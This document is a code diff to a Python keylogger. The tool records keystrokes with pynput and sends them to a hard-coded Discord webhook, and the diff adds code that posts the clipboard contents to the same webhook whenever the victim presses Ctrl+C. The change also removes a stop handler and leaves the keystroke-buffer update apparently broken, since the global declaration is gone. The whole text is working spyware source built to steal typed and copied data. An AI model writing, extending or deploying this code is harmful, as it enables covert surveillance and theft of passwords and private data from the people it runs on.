@@ -5,6 +5,7 @@ import subprocess
 import time
 from pynput import keyboard
 import psutil
+import pyperclip
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -26,6 +27,9 @@ special_keys = {
     keyboard.Key.cmd: " CMD ",
     keyboard.Key.esc: " ESC ",
 }
+
+# Store keys pressed
+keys_pressed = set()
 
 username = os.getlogin()
 
@@ -77,25 +81,33 @@ def keystroke_monitor():
 
 
 def on_press(key):
-    global keystrokes, last_keypress_time
+    """Called when a key is pressed."""
     try:
-        key_str = key.char
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            keys_pressed.add("ctrl")
+        elif key.char == 'c' and "ctrl" in keys_pressed:
+            # User pressed Ctrl+C, send clipboard content
+            clipboard_content = pyperclip.paste()
+            send_to_webhook(f"Clipboard content: {clipboard_content}")
+        else:
+            key_str = key.char if hasattr(key, 'char') else str(key)
+            with lock:
+                keystrokes += key_str
+                last_keypress_time = time.time()
     except AttributeError:
-        key_str = special_keys.get(key, f"[{key}]")
-
-    with lock:
-        keystrokes += key_str
-        last_keypress_time = time.time()
+        pass
 
 
 def on_release(key):
-    if key == keyboard.Key.insert:
-        send_to_webhook(f"Connection stopped by user: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
-        subprocess.run(["explorer", file_path])
-        time.sleep(1)
-        send_to_webhook(f"Opened dir...")
-        return False
+    """Called when a key is released."""
+    try:
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            keys_pressed.discard("ctrl")
+        # Stop listener on Escape key press
+        if key == keyboard.Key.esc:
+            return False
+    except AttributeError:
+        pass
 
 
 # Run kill.bat file at the start
